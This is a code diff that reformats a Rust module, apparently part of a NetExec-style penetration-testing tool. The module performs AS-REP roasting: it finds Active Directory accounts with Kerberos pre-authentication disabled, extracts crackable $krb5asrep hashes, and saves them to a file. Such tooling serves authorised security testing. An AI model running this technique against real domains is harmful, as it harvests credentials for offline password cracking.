@@ -47,9 +47,7 @@ impl NxcModule for Asreproasting {
         _opts: &ModuleOptions,
     ) -> Result<ModuleResult> {
         let ldap_session = match session.protocol() {
-            "ldap" => session
-                .downcast_mut::<nxc_protocols::ldap::LdapSession>()
-                .unwrap(),
+            "ldap" => session.downcast_mut::<nxc_protocols::ldap::LdapSession>().unwrap(),
             _ => return Err(anyhow::anyhow!("Module only supports LDAP")),
         };
 
@@ -61,27 +59,20 @@ impl NxcModule for Asreproasting {
         let protocol = nxc_protocols::ldap::LdapProtocol::new();
         let base_dn = protocol.get_base_dn(ldap_session).await?;
 
-        tracing::debug!(
-            "asreproasting: Searching for ASREProastable users in {}",
-            base_dn
-        );
+        tracing::debug!("asreproasting: Searching for ASREProastable users in {}", base_dn);
 
         // Filter: DONT_REQ_PREAUTH (0x400000 = 4194304)
         let filter = "(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
 
         let attrs = vec!["sAMAccountName", "userAccountControl", "pwdLastSet"];
 
-        let entries = protocol
-            .search(ldap_session, &base_dn, ldap3::Scope::Subtree, filter, attrs)
-            .await?;
+        let entries =
+            protocol.search(ldap_session, &base_dn, ldap3::Scope::Subtree, filter, attrs).await?;
 
         let mut output_lines = Vec::new();
         let mut results = Vec::new();
 
-        output_lines.push(format!(
-            "{:<20} {:<20} {:<15}",
-            "Username", "UAC", "Password Last Set"
-        ));
+        output_lines.push(format!("{:<20} {:<20} {:<15}", "Username", "UAC", "Password Last Set"));
         output_lines.push("-".repeat(55));
 
         for entry in &entries {
@@ -97,12 +88,8 @@ impl NxcModule for Asreproasting {
                 .and_then(|v| v.first())
                 .cloned()
                 .unwrap_or_default();
-            let pwd_last_set = entry
-                .attrs
-                .get("pwdLastSet")
-                .and_then(|v| v.first())
-                .cloned()
-                .unwrap_or_default();
+            let pwd_last_set =
+                entry.attrs.get("pwdLastSet").and_then(|v| v.first()).cloned().unwrap_or_default();
 
             let mut hash_output = "No domain available for AS-REQ".to_string();
 
@@ -114,7 +101,7 @@ impl NxcModule for Asreproasting {
                     let cipher = hex::encode(&tgt.ticket_data[16.min(tgt.ticket_data.len())..]);
 
                     hash_output =
-                        format!("$krb5asrep$23${}@{}:{}${}", sam, domain, checksum, cipher);
+                        format!("$krb5asrep$23${sam}@{domain}:{checksum}${cipher}");
                     tracing::info!("Extracted AS-REP Hash: {}", hash_output);
                 } else {
                     hash_output = "AS-REQ Failed (mocked)".to_string();
@@ -126,11 +113,7 @@ impl NxcModule for Asreproasting {
                 sam,
                 uac,
                 pwd_last_set,
-                if hash_output.starts_with("$krb") {
-                    "HASH EXTRACTED!"
-                } else {
-                    ""
-                }
+                if hash_output.starts_with("$krb") { "HASH EXTRACTED!" } else { "" }
             ));
             results.push(serde_json::json!({
                 "username": sam,
@@ -147,24 +130,19 @@ impl NxcModule for Asreproasting {
         let hashes_only: Vec<String> = results
             .iter()
             .filter_map(|r| {
-                r["hash"]
-                    .as_str()
-                    .filter(|h| h.starts_with("$krb"))
-                    .map(|h| h.to_string())
+                r["hash"].as_str().filter(|h| h.starts_with("$krb")).map(|h| h.to_string())
             })
             .collect();
 
         if !hashes_only.is_empty() {
             let file_path = std::env::current_dir()?.join("asreproastable.txt");
-            let mut file = std::fs::OpenOptions::new()
-                .create(true)
-                .append(true)
-                .open(&file_path)?;
+            let mut file =
+                std::fs::OpenOptions::new().create(true).append(true).open(&file_path)?;
             use std::io::Write;
             for h in hashes_only {
-                writeln!(file, "{}", h)?;
+                writeln!(file, "{h}")?;
             }
-            output_lines.push(format!("Saved extracted hashes to {:?}", file_path));
+            output_lines.push(format!("Saved extracted hashes to {file_path:?}"));
         }
 
         Ok(ModuleResult {
